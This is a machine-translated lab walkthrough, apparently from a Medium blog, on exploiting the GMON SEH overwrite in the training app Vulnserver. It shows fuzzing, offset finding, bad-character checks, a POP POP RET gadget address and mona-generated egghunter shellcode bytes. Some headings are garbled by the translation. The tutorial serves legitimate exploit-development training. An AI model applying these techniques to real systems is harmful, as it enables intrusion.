<html>
<head>
<title>[ExpDev] Vulnserver — Part 3</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Vulnserver —第3部分</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/expdev-vulnserver-part-3-24859bd31c0a?source=collection_archive---------4-----------------------#2020-07-18">https://infosecwriteups.com/expdev-vulnserver-part-3-24859bd31c0a?source=collection_archive---------4-----------------------#2020-07-18</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div class="gh gi jq"><img src="../Images/8b8a7238c600f0aea6fccb038a3ae9ca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*yVu7hmjmZwEBRarT.png"/></div></figure><h1 id="d71c" class="jx jy it bd jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku bi translated">Vulnserver —第3部分(GMON — SEH覆盖)</h1><p id="cb70" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">这将是第三个<code class="fe lt lu lv lw b">vulnserver</code> exploit系列。这次我们将模糊和利用易受攻击的命令<code class="fe lt lu lv lw b">GMON</code>。我们将首先用一个普通的<code class="fe lt lu lv lw b">EIP</code>覆盖来识别一个崩溃点。然后我们将深入探讨如何利用<code class="fe lt lu lv lw b">SEH</code>覆盖来控制崩溃时的堆栈。最后，我们将利用Egghunter从受限空间逃到更大的土地，以引入我们的shell代码，最终得到一个bind shell。我们开始吧！</p><h1 id="f505" class="jx jy it bd jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku bi translated">实验室环境</h1><ul class=""><li id="7603" class="lx ly it kx b ky kz lc ld lg lz lk ma lo mb ls mc md me mf bi translated"><strong class="kx iu">操作系统:</strong> Windows 7 (x86)</li><li id="f50b" class="lx ly it kx b ky mg lc mh lg mi lk mj lo mk ls mc md me mf bi translated"><strong class="kx iu">调试器:</strong> OllyDbg，WinDbg (mona.py)</li><li id="6fc7" class="lx ly it kx b ky mg lc mh lg mi lk mj lo mk ls mc md me mf bi translated"><strong class="kx iu">模糊器:</strong>模糊器</li><li id="3330" class="lx ly it kx b ky mg lc mh lg mi lk mj lo mk ls mc md me mf bi translated"><strong class="kx iu">目标:</strong> Vulnserver — <code class="fe lt lu lv lw b">GMON</code>命令(<code class="fe lt lu lv lw b">SEH</code>覆盖)</li></ul><p id="9181" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">详细的实验室设置指南可在<a class="ae mq" href="https://medium.com/@bigb0ss/expdev-vulnserver-part-1-ba35b9e36478" rel="noopener">这里</a>找到</p><ul class=""><li id="9135" class="lx ly it kx b ky ml lc mm lg mr lk ms lo mt ls mc md me mf bi translated">"<strong class="kx iu">Vulnserver—第一部分</strong>"</li></ul></div><div class="ab cl mu mv hx mw" role="separator"><span class="mx bw bk my mz na"/><span class="mx bw bk my mz na"/><span class="mx bw bk my mz"/></div><div class="im in io ip iq"><h1 id="a9d1" class="jx jy it bd jz ka nb kc kd ke nc kg kh ki nd kk kl km ne ko kp kq nf ks kt ku bi translated">初步侦察</h1><p id="447d" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">让我们快速检查一下<code class="fe lt lu lv lw b">GMON</code>命令是做什么的。</p><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div class="gh gi ng"><img src="../Images/c8a8969521edf713aec3dfd87229663a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1206/format:webp/1*2pR9eYr3eyZCG0L_iqcXbQ.png"/></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">GMON命令</figcaption></figure></div><div class="ab cl mu mv hx mw" role="separator"><span class="mx bw bk my mz na"/><span class="mx bw bk my mz na"/><span class="mx bw bk my mz"/></div><div class="im in io ip iq"><h1 id="e93d" class="jx jy it bd jz ka nb kc kd ke nc kg kh ki nd kk kl km ne ko kp kq nf ks kt ku bi translated">起毛</h1><p id="18c1" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">因为我们已经有了之前在第1部分中创建的模糊脚本，我们可以对我们的模糊器做一些小的改动。</p><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div class="gh gi np"><img src="../Images/a923fe243ce89e11c167bbdd666a39f6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1086/format:webp/1*8Tw__yNqy-cu3-RXyGVDxw.png"/></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">来源:<a class="ae mq" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/GMON%20-%20SEH%20Overwrite/fuzz_gmon.py" rel="noopener ugc nofollow" target="_blank">fuzz _ gmon . py by bigboss</a></figcaption></figure><p id="0b71" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">像往常一样，让我们用OllyDbg连接<code class="fe lt lu lv lw b">vulnserver</code>。然后，运行我们的fuzzer。</p><pre class="nh ni nj nk gt nq lw nr ns aw nt bi"><span id="da8d" class="nu jy it lw b gy nv nw l nx ny"><strong class="lw iu">### Running the Fuzzer</strong><br/>C:\Users\bigb0ss\Desktop\scripts\GMON&gt;python fuzz_gmon.py</span></pre><p id="29c3" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">运行我们的fuzzing脚本几秒钟后，<code class="fe lt lu lv lw b">vulnserver</code>崩溃了。从OllyDbg的崩溃中，我们可以清楚地看到<code class="fe lt lu lv lw b">GMON</code>命令和过多的字符数导致了崩溃。</p><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi nz"><img src="../Images/2c35da347499b2943250f13b0d4816aa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GZ0oxOQu6RgzvfwMC_40ug.png"/></div></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">初始碰撞</figcaption></figure></div><div class="ab cl mu mv hx mw" role="separator"><span class="mx bw bk my mz na"/><span class="mx bw bk my mz na"/><span class="mx bw bk my mz"/></div><div class="im in io ip iq"><h2 id="85c5" class="nu jy it bd jz oe of dn kd og oh dp kh lg oi oj kl lk ok ol kp lo om on kt oo bi translated">模糊分析</h2><p id="aa72" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">同样，为了确定有多少字符导致了最初的崩溃，我们需要分析Boofuzz的结果。在计算了碰撞时OllyDbg中的“/”<code class="fe lt lu lv lw b">2F</code>的近似字符并查看“DB浏览器”后，我们可以为初始碰撞选择4103个字节。</p><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi op"><img src="../Images/f2340ecbf08aa6c5b114c98305a99d56.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HgP8kwaCfNjvdUxMzRhj4g.png"/></div></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">数据库浏览器分析</figcaption></figure></div><div class="ab cl mu mv hx mw" role="separator"><span class="mx bw bk my mz na"/><span class="mx bw bk my mz na"/><span class="mx bw bk my mz"/></div><div class="im in io ip iq"><h1 id="f0cc" class="jx jy it bd jz ka nb kc kd ke nc kg kh ki nd kk kl km ne ko kp kq nf ks kt ku bi translated">剥削</h1><h2 id="7361" class="nu jy it bd jz oe of dn kd og oh dp kh lg oi oj kl lk ok ol kp lo om on kt oo bi translated">初始崩溃概念验证</h2><p id="97fa" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">让我们创建一个python脚本来重现崩溃。</p><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div class="gh gi np"><img src="../Images/e22fdc621a8ad5edb9f1187f6207f512.png" data-original-src="https://miro.medium.com/v2/resize:fit:1086/format:webp/1*ASrmnSLQRdF2uuDZHxW52A.png"/></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">来源:<a class="ae mq" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/GMON%20-%20SEH%20Overwrite/crash_gmon.py" rel="noopener ugc nofollow" target="_blank">crash _ gmon . py by bigboss</a></figcaption></figure><p id="71a9" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">启动<code class="fe lt lu lv lw b">vulnserver</code>并将其连接到OllyDbg。然后，运行<code class="fe lt lu lv lw b">crash_gmon.py</code>脚本。我们成功地用PoC脚本重现了崩溃。但是这次<code class="fe lt lu lv lw b">SEH</code>(结构化异常处理程序)被fuzzer提供的字符覆盖了。要查看OllyDbg中的<code class="fe lt lu lv lw b">SEH Chain</code>，请转到<code class="fe lt lu lv lw b">View</code>→<code class="fe lt lu lv lw b">SEH Chain</code></p><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi oq"><img src="../Images/07b1645d6bd742bfa244df28977300e1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*d-ZwVRcn6ePZ50BQckrHnA.png"/></div></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">再现车祸</figcaption></figure></div><div class="ab cl mu mv hx mw" role="separator"><span class="mx bw bk my mz na"/><span class="mx bw bk my mz na"/><span class="mx bw bk my mz"/></div><div class="im in io ip iq"><h2 id="f445" class="nu jy it bd jz oe of dn kd og oh dp kh lg oi oj kl lk ok ol kp lo om on kt oo bi translated">寻找偏移</h2><p id="7dae" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">我们的下一步是找到一个偏移量来控制<code class="fe lt lu lv lw b">SEH</code>崩溃时的时间。我们首先需要创建4103个独特的角色。我们将使用WinDbg和mona.py的<code class="fe lt lu lv lw b">pattern_create</code>模块来完成这项工作。</p><p id="fae1" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">运行WinDbg后，键入以下命令来加载python模块并创建模式。</p><pre class="nh ni nj nk gt nq lw nr ns aw nt bi"><span id="6e5f" class="nu jy it lw b gy nv nw l nx ny"><strong class="lw iu">### Loading Python Extension of WinDbg</strong><br/>.load pykd.pyd</span><span id="c41c" class="nu jy it lw b gy or nw l nx ny"><strong class="lw iu">### Mona.py Pattern_create</strong><br/>!py mona pattern_create 4103</span></pre><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi os"><img src="../Images/155d7362fb8f866f5864bbb4f9fe6673.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9wF_qebanjCQMgcY5BsJtg.png"/></div></div></figure><p id="da1e" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">让我们用创建的模式更新我们的PoC脚本，并针对<code class="fe lt lu lv lw b">vulnserver</code>再次运行脚本。</p><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div class="gh gi ot"><img src="../Images/1657471763bbc0c1c97033309152f376.png" data-original-src="https://miro.medium.com/v2/resize:fit:1222/format:webp/1*96VmrBKjuVBxKiwMugCM8w.png"/></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">来源:<a class="ae mq" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/GMON%20-%20SEH%20Overwrite/pattern_gmon.py" rel="noopener ugc nofollow" target="_blank">pattern _ gmon . py by bigboss</a></figcaption></figure><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi ou"><img src="../Images/89094a58ce80130893ea77d173a543ae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lNYQ5VRf6DMvpLSsgOF7XA.png"/></div></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">Pattern_gmon.py结果</figcaption></figure><p id="cba6" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated"><code class="fe lt lu lv lw b">SEH</code>现在被值<code class="fe lt lu lv lw b">45346E45</code>覆盖。让我们再次使用mona.py来查找偏移量。这次，我们将使用名为<code class="fe lt lu lv lw b">pattern_offset</code>的模块。</p><pre class="nh ni nj nk gt nq lw nr ns aw nt bi"><span id="9b1f" class="nu jy it lw b gy nv nw l nx ny"><strong class="lw iu">### Mona.py Pattern_offset</strong><br/>!py mona pattern_offset 45346E45</span></pre><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi ov"><img src="../Images/f443ed4cdd034f4a7c45ff406abdc91b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yhkHPvocbLRAX4OWrCkmRw.png"/></div></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">偏移量= 3522</figcaption></figure><p id="c0e7" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">它发现偏移量为3522。让我们再次更新我们的PoC脚本，并通过对<code class="fe lt lu lv lw b">vulnserver</code>运行它来确认偏移。</p></div><div class="ab cl mu mv hx mw" role="separator"><span class="mx bw bk my mz na"/><span class="mx bw bk my mz na"/><span class="mx bw bk my mz"/></div><div class="im in io ip iq"><h2 id="9a04" class="nu jy it bd jz oe of dn kd og oh dp kh lg oi oj kl lk ok ol kp lo om on kt oo bi translated">确认偏移</h2><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div class="gh gi ow"><img src="../Images/6627b14aa01f093b0c2efb0d003d0a8f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1166/format:webp/1*8O6lj7xNk8KuuYXI0_tTDg.png"/></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">来源:<a class="ae mq" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/GMON%20-%20SEH%20Overwrite/offset_gmon.py" rel="noopener ugc nofollow" target="_blank">offset _ gmon . py by bigboss</a></figcaption></figure><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi ox"><img src="../Images/caa774a868377848797aa6781c9344b9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7I_2i5SVJbXrVm77Nd83Yg.png"/></div></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">确认偏移</figcaption></figure><p id="2e64" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">这种偏移确实是正确的。现在，我们都准备好在碰撞时控制<code class="fe lt lu lv lw b">SEH</code>。</p></div><div class="ab cl mu mv hx mw" role="separator"><span class="mx bw bk my mz na"/><span class="mx bw bk my mz na"/><span class="mx bw bk my mz"/></div><div class="im in io ip iq"><h2 id="25df" class="nu jy it bd jz oe of dn kd og oh dp kh lg oi oj kl lk ok ol kp lo om on kt oo bi translated">检查不良字符</h2><p id="cee1" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">接下来，让我们检查<code class="fe lt lu lv lw b">GMON</code>命令的任何错误或受限字符。我们将使用mona.py的<code class="fe lt lu lv lw b">bytearray</code>命令创建一个从<code class="fe lt lu lv lw b">\x01</code>到<code class="fe lt lu lv lw b">\xFF</code>的字节列表。(<code class="fe lt lu lv lw b">\x00</code> =空终止符通常是一个坏字符，所以我们可以在生成带有<code class="fe lt lu lv lw b">-cpb</code>标志的列表时排除它)</p><pre class="nh ni nj nk gt nq lw nr ns aw nt bi"><span id="989c" class="nu jy it lw b gy nv nw l nx ny"><strong class="lw iu">### Mona.py Bytearray</strong><br/>!py mona.py bytearray -cpb \x00</span></pre><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div class="gh gi oy"><img src="../Images/615fe56b60ae552b5f5bfba7147da88b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1344/format:webp/0*sjcXpHIR63JRoiX_.png"/></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">mona.py — bytearray</figcaption></figure><blockquote class="oz pa pb"><p id="94d4" class="kv kw pc kx b ky ml la lb lc mm le lf pd mn li lj pe mo lm ln pf mp lq lr ls im bi translated">这样做的一个问题是，在<code class="fe lt lu lv lw b">SEH</code>覆盖点之后，我们只剩下52字节的空闲空间。所以为了检查坏字符，这次我在<code class="fe lt lu lv lw b">SEH</code>覆盖点前加了<code class="fe lt lu lv lw b">bytearray</code>。</p></blockquote><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div class="gh gi pg"><img src="../Images/e21e9b21aaf0d26dd9833a174a0ec209.png" data-original-src="https://miro.medium.com/v2/resize:fit:1332/format:webp/1*0cVfwKFcOwJUn6DtsUXLpA.png"/></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">缺乏检查所有<code class="fe lt lu lv lw b">bytearray</code>的空间</figcaption></figure><p id="cf01" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">让我们用这些<code class="fe lt lu lv lw b">bytearray</code>更新我们的PoC脚本，再次将<code class="fe lt lu lv lw b">vulnserver</code>附加到OllyDbg并运行<code class="fe lt lu lv lw b">badchar_trun.py</code>脚本。当它崩溃时，检查是否有任何字节被损坏。</p><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi ph"><img src="../Images/11806dac72d83aee5a74449c3d0336d9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mXBFzZETcIJ7uwV3nXrBvg.png"/></div></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">来源:<a class="ae mq" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/GMON%20-%20SEH%20Overwrite/badchar_gmon.py" rel="noopener ugc nofollow" target="_blank">bad char _ gmon . py by bigb0ss</a></figcaption></figure><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi pi"><img src="../Images/359bf01437aa4daf78ea0ff4f56aceee.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xY4CReY4zDQhvPHRQW_7ng.png"/></div></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">检查不良字符</figcaption></figure><p id="b7f9" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">没有字节被损坏，我们很好地检查坏字符。</p></div><div class="ab cl mu mv hx mw" role="separator"><span class="mx bw bk my mz na"/><span class="mx bw bk my mz na"/><span class="mx bw bk my mz"/></div><div class="im in io ip iq"><h2 id="5551" class="nu jy it bd jz oe of dn kd og oh dp kh lg oi oj kl lk ok ol kp lo om on kt oo bi translated">寻找流行音乐</h2><p id="8851" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">对于典型的<code class="fe lt lu lv lw b">SEH</code>覆盖利用，我们需要找到<code class="fe lt lu lv lw b">POP POP RET</code>指令小工具。我们将使用mona.py的<code class="fe lt lu lv lw b">seh</code>命令在vulnserver应用程序的dll中搜索POP POP RET。首先，将<code class="fe lt lu lv lw b">vulnserver</code>连接到WinDbg并运行以下命令:</p><pre class="nh ni nj nk gt nq lw nr ns aw nt bi"><span id="48ba" class="nu jy it lw b gy nv nw l nx ny"><strong class="lw iu">### Mona.py Finding "POP POP RET"</strong><br/>!py mona seh</span></pre><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi pj"><img src="../Images/04281d7d631cad21e27e304c61b3bfc7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0j0-EVOp9GS2hqJpZ2PULQ.png"/></div></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">mona.py seh命令结果</figcaption></figure><pre class="nh ni nj nk gt nq lw nr ns aw nt bi"><span id="059d" class="nu jy it lw b gy nv nw l nx ny"><strong class="lw iu">0x6250172b</strong> |   0x6250172b : pop edi # pop ebp # ret  | asciiprint,ascii {PAGE_EXECUTE_READ} [essfunc.dll] <strong class="lw iu">ASLR: False, Rebase: False, SafeSEH: False</strong>, OS: False, v-1.0- (C:\Users\bigb0ss\Desktop\software\vulnserver\essfunc.dll)</span><span id="a763" class="nu jy it lw b gy or nw l nx ny"><em class="pc">(*Note: Make sure to choose one with "ASLR: False, Rebase: False and SafeSEH: False")</em></span></pre><p id="a717" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">让我们使用其中一个地址<code class="fe lt lu lv lw b">0x6250172b</code>，并更新我们的PoC脚本。并再次将vulnserver附加到OllyDbg，在<code class="fe lt lu lv lw b">0x6250172b</code> ( <code class="fe lt lu lv lw b">SEH</code>)地址设置一个断点。</p><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div class="gh gi pk"><img src="../Images/e52ba2f3378f3b54d7f4ed2fb34345fb.png" data-original-src="https://miro.medium.com/v2/resize:fit:760/format:webp/1*O17-9rrqI2GA6yAvNGPBRA.png"/></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">断点</figcaption></figure><p id="8b0d" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">当我们运行PoC脚本时，我们确实碰到了<code class="fe lt lu lv lw b">POP POP RET</code>地址，即断点。</p><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div class="gh gi pl"><img src="../Images/4bbdf9f5f54db91445d4a9e990d1a2b6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1216/format:webp/1*BAqvBseF1LOS07-he7lSSg.png"/></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">来源:<a class="ae mq" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/GMON%20-%20SEH%20Overwrite/pop-pop-ret_gmon.py" rel="noopener ugc nofollow" target="_blank">pop-pop-ret _ gmon . py by bigboss</a></figcaption></figure><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi pm"><img src="../Images/d777d914827dbf00e2b9189f13167246.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gmlTHrXNf1D8O4e-fyJr_Q.png"/></div></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">弹出弹出RET (0x6250172B)</figcaption></figure><p id="3572" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">酷毙了。在崩溃时，我们可以看到<code class="fe lt lu lv lw b">SEH</code>被我们提供的<code class="fe lt lu lv lw b">POP POP RET</code> <code class="fe lt lu lv lw b">0x6250172b</code>地址覆盖。现在，输入<code class="fe lt lu lv lw b">Shift + F9</code>允许异常继续进行。它会命中<code class="fe lt lu lv lw b">POP POP RET</code>的<code class="fe lt lu lv lw b">0x6250172b</code>地址。</p><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="oa ob di oc bf od"><div class="gh gi pn"><img src="../Images/24682655e587ad51c52d9f9e61a6cdf8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gml_8h1_BXIgijoJHfSm_w.png"/></div></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">在允许例外之后</figcaption></figure><p id="8c76" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">按下<code class="fe lt lu lv lw b">F7</code>步进指令，直到<code class="fe lt lu lv lw b">RET</code>。当我们点击<code class="fe lt lu lv lw b">RET</code>后，我们将被重定向到我们控制的缓冲区，特别是在我们通过漏洞脚本提供的<code class="fe lt lu lv lw b">POP POP RET</code> <code class="fe lt lu lv lw b">0x6250172b</code>地址之前的4个字节。</p><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div class="gh gi po"><img src="../Images/bf4c8c329b9d454a409262eb403fdcd9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1168/format:webp/1*rzrb3XO1bAQgl2ki-KV9Rw.png"/></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">RET指令后的地址</figcaption></figure></div><div class="ab cl mu mv hx mw" role="separator"><span class="mx bw bk my mz na"/><span class="mx bw bk my mz na"/><span class="mx bw bk my mz"/></div><div class="im in io ip iq"><h2 id="e87d" class="nu jy it bd jz oe of dn kd og oh dp kh lg oi oj kl lk ok ol kp lo om on kt oo bi translated">短JMP</h2><p id="65a2" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">从上面的截图可以看出，我们只有4个字节可以玩。我们能做的就是引入一个9字节的短跳转(<code class="fe lt lu lv lw b">EB</code>)移动到下面稍微大一点的自由空间。使用OllyDbg中的“二进制编辑”来快速确认我们的短跳。</p><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div class="gh gi pp"><img src="../Images/855fc9b1be4f081ac11babbf4fac5e05.png" data-original-src="https://miro.medium.com/v2/resize:fit:1308/format:webp/1*feEb2C7KggeRUTgUvZpzaA.png"/></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">短JMP</figcaption></figure><p id="2b00" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">短跳之后，我们会有下面的49个字节可以玩。这也没有足够的空间来介绍我们的绑定/反向外壳代码；然而，我们可以利用一个叫做Egghunter的很酷的小工具跳到另外一个更大的地方。(如果你想知道Egghunter是什么，请在这里看看我之前关于Egghunter的一篇博文<a class="ae mq" href="https://medium.com/@bigb0ss/expdev-winamp-5-12-exploitation-using-egghunter-6efb2c8a863b" rel="noopener">。)让我们在继续下一步之前更新我们的PoC脚本。</a></p><figure class="nh ni nj nk gt ju gh gi paragraph-image"><div class="gh gi pq"><img src="../Images/cbce5cec2b68b00ea2f16ba012f54e4c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1324/format:webp/1*AnJKWSb7VaQ6IBWJwSfspg.png"/></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">来源:<a class="ae mq" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/GMON%20-%20SEH%20Overwrite/short-jmp_gmon.py" rel="noopener ugc nofollow" target="_blank">short-jmp _ gmon . py by bigboss</a></figcaption></figure></div><div class="ab cl mu mv hx mw" role="separator"><span class="mx bw bk my mz na"/><span class="mx bw bk my mz na"/><span class="mx bw bk my mz"/></div><div class="im in io ip iq"><h2 id="e764" class="nu jy it bd jz oe of dn kd og oh dp kh lg oi oj kl lk ok ol kp lo om on kt oo bi translated">鸡蛋猎人</h2><p id="a509" class="pw-post-body-paragraph kv kw it kx b ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls im bi translated">基本上Egghunter要做的是，只要我们把我们选择的egg(例如，<code class="fe lt lu lv lw b">b0ss</code>)放到堆栈上，Egghunter就会迭代内存空间来寻找我们的egg并跳转到那里。这是非常性感的技巧，也是从受限空间逃到更大空间的简单方法。让我们使用mona.py的<code class="fe lt lu lv lw b">egg</code>命令创建Egghunter外壳代码。</p><pre class="nh ni nj nk gt nq lw nr ns aw nt bi"><span id="f302" class="nu jy it lw b gy nv nw l nx ny"><strong class="lw iu">### Mona.py Generating Egghunter</strong><br/>!py mona egg -t T00W             <strong class="lw iu"># "-t" for your choice of the egg</strong></span><span id="4fc5" class="nu jy it lw b gy or nw l nx ny">[+] Egg set to b0ss<br/>[+] Generating traditional 32bit egghunter code<br/>[+] Preparing output file 'egghunter.txt'<br/>    - (Re)setting logfile egghunter.txt<br/><strong class="lw iu">[+] Egghunter  (33 bytes): <br/>"\xcc\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a"<br/>"\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff"<br/>"\xe7"</strong></span></pre><p id="cb57" class="pw-post-body-paragraph kv kw it kx b ky ml la lb lc mm le lf lg mn li lj lk mo lm ln lo mp lq lr ls im bi translated">从蛋猎人跳下的理想地点是我们的偏移区域。我们将有大约3000+字节的空间。知道了这一切，让我们来策划我们最后的剥削。</p><blockquote class="oz pa pb"><p id="678a" class="kv kw pc kx b ky ml la lb lc mm le lf pd mn li lj pe mo lm ln pf mp lq lr ls im bi translated">mona.py生成的Egghunter的一个警告是，第一个字节“<code class="fe lt lu lv lw b">\xcc</code>”被称为INT 3指令，它用于调用调试异常处理程序。基本上，当我们设置一个断点时，调试器使用这个带有断点的INT 3。不知何故，当它被添加到Egghunter时，它会在发送漏洞脚本时终止程序。所以只要用“<code class="fe lt lu lv lw b">\x90</code>”NOP指令替换就行了。然后，就可以工作了:)</p></blockquote></div><div class="ab cl mu mv hx mw" role="separator"><span class="mx bw bk my mz na"/><span class="mx bw bk my 